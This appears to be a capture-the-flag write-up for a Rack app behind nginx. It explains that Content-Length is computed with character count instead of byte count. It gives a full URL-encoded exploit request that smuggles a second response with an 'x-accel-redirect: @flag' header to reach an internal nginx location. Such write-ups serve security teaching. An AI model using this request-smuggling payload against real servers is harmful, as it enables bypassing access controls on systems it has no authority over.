# Details

the Rack app at `feed/config.ru` when calculating the response size (`Content-Length` header) uses `body.size` instead of `body.bytesize`, the first is unicode aware and would return the count of characters not size.

```
irb(main):001> "💎".size
=> 1
irb(main):002> "💎".bytesize
=> 4
irb(main):003> 
```

from there you can inject a secondary controlled response in the connection, the second piece is to return this header to nginx, so that it evaluates the -normally- unreachable `@flag` named location:

```http
x-accel-redirect: @flag
```

exploit:

```http
GET /fortify/feed?style=%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80%CF%80HTTP/1.1+200+OK%0d%0aContent-Length:+103%0d%0ax-accel-redirect:+@flag%0d%0a%0d%0a HTTP/1.1
Cookie: client_id=dc72b59e82c5bd59b495aaa5cccee264
Host: localhost

GET /fortify/feed HTTP/1.1
Host: localhost
Cookie: client_id=dc72b59e82c5bd59b495aaa5cccee264


```
